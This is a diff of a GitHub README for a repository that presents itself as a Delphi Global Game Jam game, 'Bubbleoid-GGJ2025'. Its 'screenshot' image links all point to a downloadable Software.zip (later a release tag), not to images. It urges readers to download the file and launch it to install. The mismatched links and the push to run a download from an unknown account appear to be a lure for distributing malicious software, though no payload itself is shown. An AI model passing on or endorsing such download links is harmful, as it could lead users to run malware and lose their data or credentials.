@@ -9,14 +9,14 @@ This repository contains my game developed in Delphi for the Global Game Jam 202
 🕹️ delphi, delphi-game, firemonkey, firemonkey-applications, game-programming, game-source, gamedev, gamedevelopment, gfgsk-game, ggj, ggj2025, globalgamejam
 
 ## Software
-🚀 To download the latest version of the game, click here: [![Download Software](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/download/v1.0/Software.zip)](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/download/v1.0/Software.zip)
+🚀 To download the latest version of the game, click here: [![Download Software](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/tag/v2.0)](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/tag/v2.0)
 ℹ️ *Note: The downloaded file needs to be launched to install the game.*
 
 ## Screenshots
 📸 Take a sneak peek at the game:
-![Screenshot 1](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/download/v1.0/Software.zip)
-![Screenshot 2](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/download/v1.0/Software.zip)
-![Screenshot 3](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/tag/v2.0)
+![Screenshot 2](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/tag/v2.0)
+![Screenshot 3](https://github.com/TuanAnh1247374848/Bubbleoid-GGJ2025/releases/tag/v2.0)
 
 ## Instructions
 🔍 Follow these simple steps to start playing Bubbleoid-GGJ2025:
